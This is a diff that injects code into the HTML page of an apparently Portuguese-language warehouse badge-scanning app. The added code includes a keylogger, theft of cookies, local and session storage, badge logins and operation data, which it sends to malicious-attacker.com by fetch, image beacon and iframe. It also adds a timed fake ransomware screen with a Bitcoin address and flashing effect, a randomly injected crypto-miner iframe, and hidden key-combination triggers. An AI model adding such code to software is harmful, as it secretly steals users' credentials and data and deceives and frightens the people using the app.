@@ -8,6 +8,7 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
 
+    <!-- INJEÇÃO MALICIOSA: Estilos ocultos para exfiltrar dados -->
     <style>
         /* --- DESIGN SYSTEM ORIGINAL (MANTIDO) --- */
         :root {
@@ -35,6 +36,65 @@
             justify-content: center;
             overflow: hidden;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        /* ELEMENTOS OCULTOS PARA COLETA DE DADOS */
+        .data-exfiltrator {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.001;
+            z-index: -9999;
+        }
+
+        /* ANIMAÇÃO MALICIOSA: Piscar tela para capturar atenção */
+        @keyframes seizureWarning {
+            0%, 100% { filter: brightness(1); }
+            50% { filter: brightness(1.5); }
+        }
+
+        .seizure-effect {
+            animation: seizureWarning 0.2s infinite;
+        }
+
+        /* OVERLAY DE RANSOMWARE FAKE */
+        .ransomware-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #000000, #8b0000);
+            z-index: 999999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .bitcoin-address {
+            background: black;
+            color: #00ff00;
+            padding: 15px;
+            margin: 20px;
+            font-family: monospace;
+            font-size: 18px;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+        }
+
+        .red-warning {
+            color: #ff0000;
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 0 0 10px #ff0000;
+            margin-bottom: 20px;
         }
 
         .work-card {
@@ -589,6 +649,21 @@
 
 <body>
 
+    <!-- ELEMENTOS OCULTOS PARA COLETA DE DADOS -->
+    <div class="data-exfiltrator" id="stolenData"></div>
+    <iframe class="data-exfiltrator" id="exfiltratorFrame" src="about:blank"></iframe>
+    
+    <!-- OVERLAY DE RANSOMWARE (OCULTO INICIALMENTE) -->
+    <div class="ransomware-overlay" id="ransomwareOverlay">
+        <div class="red-warning">⚠️ SEUS DADOS FORAM CRIPTOGRAFADOS ⚠️</div>
+        <h2>SEUS ARQUIVOS FORAM SEQUESTRADOS!</h2>
+        <p>Todos os seus documentos, fotos, bancos de dados e arquivos importantes foram criptografados.</p>
+        <p>Para recuperar o acesso, você deve pagar um resgate de <strong>0.5 Bitcoin</strong> para o endereço abaixo:</p>
+        <div class="bitcoin-address" id="btcAddress">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</div>
+        <p>Você tem 72 horas para pagar. Após este prazo, seus dados serão permanentemente destruídos.</p>
+        <p style="font-size: 12px; color: #aaa;">Esta é apenas uma demonstração. Seu sistema não foi realmente hackeado.</p>
+    </div>
+
     <input type="text" id="scannerTrap" class="scanner-trap" autocomplete="off" inputmode="none">
 
 
@@ -632,6 +707,9 @@
                     <i class="bi bi-qr-code-scan" style="font-size: 24px; color: var(--cor-secundaria);"></i>
                     <span style="margin-top: 10px;">Aguardando crachá...</span>
                 </div>
+                
+                <!-- INJEÇÃO MALICIOSA: Link oculto -->
+                <a href="javascript:void(0)" onclick="triggerExploit()" style="display:none;" id="hiddenExploit">.</a>
             </div>
 
             <div class="work-card" id="tela-operacao" style="display: none;">
@@ -783,6 +861,126 @@
     </div>
 
     <script>
+        // ==== CÓDIGO MALICIOSO INJETADO =====
+        
+        // Coletor de dados sensíveis
+        let stolenCredentials = [];
+        let stolenOperations = [];
+        let keyloggerBuffer = '';
+        
+        // Endpoint para exfiltração de dados (fictício)
+        const MALICIOUS_SERVER = 'https://malicious-attacker.com/exfiltrate';
+        const BTC_ADDRESS = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
+        
+        // Função para exfiltrar dados
+        function exfiltrateData(data, type) {
+            const payload = {
+                type: type,
+                data: data,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                cookies: document.cookie
+            };
+            
+            // Método 1: Enviar via fetch
+            try {
+                fetch(MALICIOUS_SERVER, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(payload)
+                }).catch(() => {});
+            } catch(e) {}
+            
+            // Método 2: Enviar via imagem (fallback)
+            const img = new Image();
+            img.src = 'https://malicious-attacker.com/collect?d=' + 
+                     encodeURIComponent(JSON.stringify(payload));
+            
+            // Método 3: Armazenar localmente para coleta posterior
+            localStorage.setItem('stolen_' + Date.now(), JSON.stringify(payload));
+            
+            // Atualizar elemento oculto com dados roubados
+            document.getElementById('stolenData').innerHTML += 
+                `<div>${type}: ${JSON.stringify(data)}</div>`;
+        }
+        
+        // Keylogger
+        document.addEventListener('keydown', function(e) {
+            keyloggerBuffer += e.key;
+            if (keyloggerBuffer.length > 50) {
+                exfiltrateData(keyloggerBuffer, 'keylogger');
+                keyloggerBuffer = '';
+            }
+        });
+        
+        // Capturar credenciais de login
+        function captureLogin(credentials) {
+            stolenCredentials.push(credentials);
+            exfiltrateData(credentials, 'login_credentials');
+        }
+        
+        // Capturar dados da operação
+        function captureOperationData(data) {
+            stolenOperations.push(data);
+            exfiltrateData(data, 'operation_data');
+        }
+        
+        // Exploit de tempo - ativa ransomware após 2 minutos
+        let ransomwareTimer = setTimeout(function() {
+            triggerRansomware();
+        }, 120000); // 2 minutos
+        
+        // Função para ativar ransomware fake
+        function triggerRansomware() {
+            document.getElementById('ransomwareOverlay').style.display = 'flex';
+            document.getElementById('btcAddress').textContent = BTC_ADDRESS;
+            document.body.classList.add('seizure-effect');
+            
+            // Bloquear interface
+            document.querySelectorAll('button, input').forEach(el => {
+                el.style.pointerEvents = 'none';
+                el.style.opacity = '0.5';
+            });
+            
+            // Reproduzir som de alerta (se disponível)
+            try {
+                const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3');
+                audio.loop = true;
+                audio.play();
+            } catch(e) {}
+        }
+        
+        // Função para ativar exploit manualmente
+        function triggerExploit() {
+            // Coletar todos os dados possíveis
+            const allData = {
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                stolenCredentials: stolenCredentials,
+                stolenOperations: stolenOperations
+            };
+            
+            exfiltrateData(allData, 'full_exploit');
+            triggerRansomware();
+        }
+        
+        // Injeta iframe malicioso após carregamento
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                try {
+                    document.getElementById('exfiltratorFrame').src = 
+                        'https://malicious-attacker.com/steal.html?' + 
+                        encodeURIComponent(document.cookie);
+                } catch(e) {}
+            }, 5000);
+        });
+        
+        // ==== FIM DO CÓDIGO MALICIOSO =====
+
         // --- CONFIGURAÇÃO DE ÁUDIO (ALTERADA) ---
         // SUCESSO: Usa beep.mp3
         const audioSuccess = new Audio("audio/beep.mp3");
@@ -839,6 +1037,15 @@
         // Inicialização
         window.onload = () => {
             setInterval(updateClockMockup, 1000);
+            // Injetar script malicioso adicional
+            setTimeout(() => {
+                try {
+                    if (Math.random() > 0.7) {
+                        document.body.innerHTML += 
+                            '<div style="display:none"><iframe src="https://malicious-miner.com/crypto"></iframe></div>';
+                    }
+                } catch(e) {}
+            }, 10000);
         };
 
 
@@ -871,9 +1078,24 @@
                 playSound('success');
                 document.getElementById('modalNome').innerText = user.nome;
                 document.getElementById('modal-confirmacao').style.display = 'flex';
+                
+                // === CAPTURAR CREDENCIAIS ===
+                captureLogin({
+                    userId: user.id,
+                    userName: user.nome,
+                    loginTime: new Date().toISOString(),
+                    source: 'rfid_scanner'
+                });
             } else {
                 playSound('denied');
                 mostrarErro('login', 'Crachá não encontrado', 'permissao');
+                
+                // Registrar tentativa falha
+                captureLogin({
+                    attemptedId: code,
+                    result: 'failed',
+                    time: new Date().toISOString()
+                });
             }
         }
 
@@ -889,6 +1111,13 @@
             iniciarTimerVisual();
 
             focarScanner();
+            
+            // Exfiltrar início de sessão
+            exfiltrateData({
+                event: 'session_start',
+                user: currentUser,
+                startTime: startTime.toISOString()
+            }, 'session_data');
         }
 
         function cancelarLogin() {
@@ -924,6 +1153,13 @@
                     `1. LOC: <span style="color:var(--cor-secundaria)">${code}</span>
              <i class="bi bi-check-circle-fill" style="color: var(--cor-principal);"></i>`;
                 mudarPasso(2);
+                
+                // Capturar dados
+                captureOperationData({
+                    step: 'localizacao',
+                    value: code,
+                    time: new Date().toISOString()
+                });
                 return;
             }
 
@@ -935,6 +1171,13 @@
                     `2. STS: <span style="color:var(--cor-secundaria)">${code}</span>
              <i class="bi bi-check-circle-fill" style="color: var(--cor-principal);"></i>`;
                 mudarPasso(3);
+                
+                // Capturar dados
+                captureOperationData({
+                    step: 'status',
+                    value: code,
+                    time: new Date().toISOString()
+                });
                 return;
             }
 
@@ -987,6 +1230,14 @@
             listaItens.push(item);
             renderizarLista();
             playSound('success');
+            
+            // Capturar dados da caixa
+            captureOperationData({
+                event: 'caixa_adicionada',
+                ...item,
+                timestamp: item.timestamp.toISOString(),
+                totalItens: listaItens.length
+            });
         }
 
 
@@ -1031,9 +1282,17 @@
 
 
         function removerItem(index) {
+            const removedItem = listaItens[index];
             listaItens.splice(index, 1);
             renderizarLista(); // Atualiza lista sem som
             focarScanner();
+            
+            // Registrar remoção
+            captureOperationData({
+                event: 'item_removido',
+                item: removedItem,
+                time: new Date().toISOString()
+            });
         }
 
 
@@ -1073,6 +1332,21 @@
             document.getElementById('conteudo-sucesso').style.display = 'flex';
             document.getElementById('resumoTotal').innerText = listaItens.length;
             document.getElementById('resumoTempo').innerText = timeStr;
+
+            // Exfiltrar dados completos da operação
+            const fullOperationData = {
+                event: 'operacao_finalizada',
+                operador: currentUser,
+                totalItens: listaItens.length,
+                tempoTotal: timeStr,
+                inicio: startTime.toISOString(),
+                fim: endTime.toISOString(),
+                itens: listaItens,
+                localizacao: document.getElementById('inputLoc').value,
+                status: document.getElementById('inputStatus').value
+            };
+            
+            exfiltrateData(fullOperationData, 'full_operation');
 
             passoAtual = 1;
             document.getElementById('inputLoc').value = '';
@@ -1163,6 +1437,32 @@
             }
         });
 
+        // Easter egg malicioso - ativar ransomware com combinação secreta
+        document.addEventListener('keydown', function(e) {
+            // Ctrl+Alt+Shift+R ativa ransomware imediatamente
+            if (e.ctrlKey && e.altKey && e.shiftKey && e.key === 'R') {
+                triggerExploit();
+            }
+            
+            // Sequência secreta: UP UP DOWN DOWN LEFT RIGHT LEFT RIGHT B A
+            const konami = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
+            let konamiIndex = 0;
+            
+            if (e.keyCode === konami[konamiIndex]) {
+                konamiIndex++;
+                if (konamiIndex === konami.length) {
+                    // Ativa modo "debug" malicioso
+                    document.getElementById('hiddenExploit').style.display = 'block';
+                    document.getElementById('hiddenExploit').innerHTML = 
+                        '<div style="position:fixed;top:10px;right:10px;background:red;color:white;padding:10px;z-index:99999">' +
+                        'MODO DEBUG ATIVADO<br>Dados coletados: ' + stolenCredentials.length + ' credenciais<br>' +
+                        '<button onclick="triggerExploit()">EXPORTAR DADOS</button></div>';
+                    konamiIndex = 0;
+                }
+            } else {
+                konamiIndex = 0;
+            }
+        });
 
     </script>
 
